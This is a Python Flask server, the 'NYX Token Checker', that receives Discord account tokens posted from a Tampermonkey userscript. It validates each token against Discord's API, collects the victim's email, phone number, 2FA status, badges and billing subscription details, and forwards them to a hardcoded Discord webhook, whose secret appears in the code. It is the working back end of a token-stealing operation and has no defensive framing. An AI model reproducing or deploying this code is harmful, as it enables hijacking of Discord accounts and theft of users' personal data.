from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import os
from datetime import datetime
import logging
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Discord webhook URL (set in Render environment variables)
DISCORD_WEBHOOK = os.getenv('DISCORD_WEBHOOK', 'https://discord.com/api/webhooks/1469196049858957425/h49L6NNy9XMHLhhUe372RfL5Dwzvbk9JSb8pEb7BP1hgV7UehmMvWH4Zav559t8V2tFj')

# Store for processed tokens (in-memory, use Redis for production)
processed_tokens = set()

def clean_token(token):
    """Clean token from quotes and escape characters"""
    if not token:
        return None
    
    # Remove surrounding quotes
    if token.startswith('"') and token.endswith('"'):
        token = token[1:-1]
    
    # Remove escape characters
    token = token.replace('\\"', '"').replace('\\', '')
    
    # Try to parse as JSON
    if token.startswith('{') and token.endswith('}'):
        try:
            data = json.loads(token)
            # Look for token in common keys
            for key in ['token', 'access_token', 'Token', 'accessToken']:
                if key in data:
                    token = data[key]
                    break
        except:
            pass
    
    return token.strip()

def is_valid_discord_token(token):
    """Check if token looks like a valid Discord token"""
    if not token or len(token) < 50:
        return False
    
    # Discord tokens are JWT format with 3 parts
    parts = token.split('.')
    if len(parts) != 3:
        return False
    
    # Check approximate lengths
    if len(parts[0]) < 20 or len(parts[1]) < 5 or len(parts[2]) < 25:
        return False
    
    return True

async def check_discord_token(token):
    """Check token with Discord API and get user info"""
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    
    try:
        # Get basic user info
        response = requests.get('https://discord.com/api/v9/users/@me', 
                               headers=headers, timeout=10)
        
        if response.status_code != 200:
            return {'valid': False, 'error': f'HTTP {response.status_code}'}
        
        user_data = response.json()
        
        # Get additional info
        badges = 'None'
        nitro_info = 'None'
        
        try:
            # Get profile for badges
            profile_response = requests.get(
                f'https://discord.com/api/v9/users/{user_data["id"]}/profile',
                headers=headers, timeout=5
            )
            if profile_response.status_code == 200:
                profile_data = profile_response.json()
                if 'badges' in profile_data:
                    badges = ', '.join([b['name'] for b in profile_data['badges']])
        except:
            pass
        
        try:
            # Get nitro subscription
            nitro_response = requests.get(
                'https://discord.com/api/v9/users/@me/billing/subscriptions',
                headers=headers, timeout=5
            )
            if nitro_response.status_code == 200:
                nitro_data = nitro_response.json()
                if nitro_data and len(nitro_data) > 0:
                    nitro = nitro_data[0]
                    nitro_info = {
                        'type': 'Classic' if nitro.get('type') == 1 else 'Nitro' if nitro.get('type') == 2 else 'Unknown',
                        'status': 'Active' if nitro.get('status') == 1 else 'Inactive',
                        'renewal': nitro.get('renewal_date')
                    }
        except:
            pass
        
        # Format user info
        user_info = {
            'valid': True,
            'username': f'{user_data.get("username", "Unknown")}#{user_data.get("discriminator", "0")}',
            'user_id': user_data.get('id'),
            'email': user_data.get('email', 'No email'),
            'verified': '✅ Verified' if user_data.get('verified') else '❌ Not verified',
            'phone': user_data.get('phone', 'No phone'),
            'mfa': '✅ Enabled' if user_data.get('mfa_enabled') else '❌ Disabled',
            'nitro': 'Classic' if user_data.get('premium_type') == 1 else 'Nitro' if user_data.get('premium_type') == 2 else 'None',
            'locale': user_data.get('locale', 'Unknown'),
            'badges': badges,
            'avatar': f'https://cdn.discordapp.com/avatars/{user_data["id"]}/{user_data.get("avatar")}.png' if user_data.get('avatar') else None,
            'banner': f'https://cdn.discordapp.com/banners/{user_data["id"]}/{user_data.get("banner")}.png' if user_data.get('banner') else None,
            'bio': user_data.get('bio', 'No bio'),
            'nitro_details': nitro_info
        }
        
        return {'valid': True, 'user_info': user_info}
        
    except Exception as e:
        return {'valid': False, 'error': str(e)}

def send_to_discord_webhook(data, is_valid=True):
    """Send formatted embed to Discord webhook"""
    
    if is_valid and 'user_info' in data:
        user = data['user_info']
        
        embed = {
            'title': '🎯 VALID TOKEN FOUND!',
            'color': 0x00ff00,
            'thumbnail': {'url': user['avatar']} if user['avatar'] else None,
            'fields': [
                {'name': '👤 Account Info', 'value': f'**Username:** {user["username"]}\n**ID:** {user["user_id"]}\n**Email:** {user["email"]}', 'inline': False},
                {'name': '🔐 Security', 'value': f'**Verified:** {user["verified"]}\n**2FA:** {user["mfa"]}', 'inline': True},
                {'name': '💎 Nitro', 'value': user['nitro'], 'inline': True},
                {'name': '📍 Locale', 'value': user['locale'], 'inline': True},
                {'name': '🎖️ Badges', 'value': user['badges'], 'inline': False},
                {'name': '⏰ Time', 'value': datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'inline': False}
            ],
            'footer': {'text': 'Render Server • NYX Checker'},
            'timestamp': datetime.now().isoformat()
        }
        
        payload = {
            'username': 'NYX Token Checker',
            'avatar_url': 'https://cdn.discordapp.com/attachments/123456789012345678/123456789012345678/nyx_logo.png',
            'embeds': [embed]
        }
    else:
        # Invalid token embed
        token_preview = data.get('token', 'Unknown')[:20] + '...' if data.get('token') else 'Unknown'
        embed = {
            'title': '❌ INVALID TOKEN',
            'color': 0xff0000,
            'fields': [
                {'name': 'Token Preview', 'value': f'`{token_preview}`', 'inline': False},
                {'name': 'Error', 'value': data.get('error', 'Unknown error'), 'inline': False},
                {'name': 'Time', 'value': datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'inline': False}
            ],
            'footer': {'text': 'Render Server • Failed Check'}
        }
        
        payload = {
            'username': 'NYX Checker - Error',
            'embeds': [embed]
        }
    
    try:
        response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
        return response.status_code == 204 or response.status_code == 200
    except Exception as e:
        logger.error(f"Failed to send to Discord: {e}")
        return False

@app.route('/api/token', methods=['POST'])
def handle_token():
    """Endpoint to receive tokens from Tampermonkey"""
    try:
        data = request.json
        if not data or 'token' not in data:
            return jsonify({'error': 'No token provided'}), 400
        
        raw_token = data['token']
        logger.info(f"Received token request: {raw_token[:30]}...")
        
        # Clean the token
        token = clean_token(raw_token)
        
        # Check if already processed (prevent duplicates)
        token_hash = hash(token)
        if token_hash in processed_tokens:
            return jsonify({'message': 'Token already processed'}), 200
        
        # Validate token format
        if not is_valid_discord_token(token):
            error_data = {'token': token[:50], 'error': 'Invalid token format'}
            send_to_discord_webhook(error_data, is_valid=False)
            return jsonify({'error': 'Invalid token format'}), 400
        
        # Check token with Discord API
        import asyncio
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(check_discord_token(token))
        loop.close()
        
        # Send result to Discord
        send_to_discord_webhook(result, is_valid=result['valid'])
        
        # Mark as processed
        processed_tokens.add(token_hash)
        
        if result['valid']:
            logger.info(f"Valid token for user: {result['user_info']['username']}")
            return jsonify({
                'message': 'Token processed successfully',
                'username': result['user_info']['username']
            }), 200
        else:
            logger.warning(f"Invalid token: {result['error']}")
            return jsonify({
                'message': 'Token is invalid',
                'error': result['error']
            }), 200
            
    except Exception as e:
        logger.error(f"Error processing token: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/api/error', methods=['POST'])
def handle_error():
    """Endpoint to receive errors from client"""
    try:
        data = request.json
        logger.error(f"Client error: {data}")
        
        # Log error to Discord if needed
        if data and 'error' in data:
            error_embed = {
                'title': '⚠️ Client Error',
                'color': 0xffaa00,
                'fields': [
                    {'name': 'Error', 'value': data['error'][:1000], 'inline': False},
                    {'name': 'URL', 'value': data.get('url', 'Unknown'), 'inline': False},
                    {'name': 'Time', 'value': data.get('timestamp', 'Unknown'), 'inline': False}
                ]
            }
            
            requests.post(DISCORD_WEBHOOK, json={
                'username': 'NYX Error Logger',
                'embeds': [error_embed]
            }, timeout=5)
        
        return jsonify({'message': 'Error logged'}), 200
    except:
        return jsonify({'message': 'Error received'}), 200

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for Render"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'processed_tokens': len(processed_tokens)
    }), 200

@app.route('/', methods=['GET'])
def index():
    """Home page"""
    return jsonify({
        'message': 'NYX Token Checker API',
        'endpoints': {
            '/api/token': 'POST - Send token for checking',
            '/api/error': 'POST - Report client errors',
            '/health': 'GET - Health check'
        },
        'status': 'operational'
    }), 200

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
